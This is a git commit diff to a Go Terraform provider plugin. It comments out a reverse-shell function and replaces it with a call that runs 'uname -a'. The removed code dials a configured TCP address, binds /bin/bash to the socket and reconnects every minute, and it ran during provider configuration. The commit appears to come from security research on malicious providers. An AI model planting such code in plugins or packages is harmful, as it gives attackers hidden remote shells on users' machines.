fc3f4910c426c1ba68911c15d08c3c3f0b56eb7f
Mathieu Deous <mathieu.deous@datadoghq.com>
2025-02-13 16:55:59 +0100

    directly run command

--- main.go
+++ main.go
@@ -2,35 +2,47 @@ package main
 
 import (
 	"context"
-	"net"
 	"os/exec"
-	"time"
+	"strings"
 
 	"github.com/hashicorp/terraform-plugin-sdk/v2/diag"
 	"github.com/hashicorp/terraform-plugin-sdk/v2/helper/schema"
 	"github.com/hashicorp/terraform-plugin-sdk/v2/plugin"
 )
 
-func reverse(address string, command string) {
-	c, err := net.Dial("tcp", address)
-	if err != nil {
-		if c != nil {
-			c.Close()
-		}
-		time.Sleep(time.Minute)
-		reverse(address, command)
-	}
+// func reverse(address string, command string) {
+// 	c, err := net.Dial("tcp", address)
+// 	if err != nil {
+// 		if c != nil {
+// 			c.Close()
+// 		}
+// 		time.Sleep(time.Minute)
+// 		reverse(address, command)
+// 	}
 
-	cmd := exec.Command(command)
-	cmd.Stdin, cmd.Stdout, cmd.Stderr = c, c, c
-	cmd.Run()
-	c.Close()
-	reverse(address, command)
+// 	cmd := exec.Command(command)
+// 	cmd.Stdin, cmd.Stdout, cmd.Stderr = c, c, c
+// 	cmd.Run()
+// 	c.Close()
+// 	reverse(address, command)
+// }
+
+func runCommand() {
+	var out strings.Builder
+	cmd := exec.Command("uname", "-a")
+	cmd.Stdout = &out
+	cmd.Stderr = &out
+	err := cmd.Run()
+	if err != nil {
+		println("ERROR: " + err.Error())
+	}
+	println(out.String())
 }
 
-func providerConfigure(_ context.Context, d *schema.ResourceData) (interface{}, diag.Diagnostics) {
+func providerConfigure(_ context.Context, _ *schema.ResourceData) (interface{}, diag.Diagnostics) {
 	var diags diag.Diagnostics
-	reverse(d.Get("address").(string), d.Get("command").(string))
+	// reverse(d.Get("address").(string), d.Get("command").(string))
+	runCommand()
 	return nil, diags
 }
 
@@ -48,15 +60,15 @@ func main() {
 		ProviderFunc: func() *schema.Provider {
 			return &schema.Provider{
 				Schema: map[string]*schema.Schema{
-					"address": {
-						Type:     schema.TypeString,
-						Required: true,
-					},
-					"command": {
-						Type:     schema.TypeString,
-						Optional: true,
-						Default:  "/bin/bash",
-					},
+					// "address": {
+					// 	Type:     schema.TypeString,
+					// 	Required: true,
+					// },
+					// "command": {
+					// 	Type:     schema.TypeString,
+					// 	Optional: true,
+					// 	Default:  "/bin/bash",
+					// },
 				},
 				ResourcesMap: map[string]*schema.Resource{
 					"dummy_resource": dummyResource(),
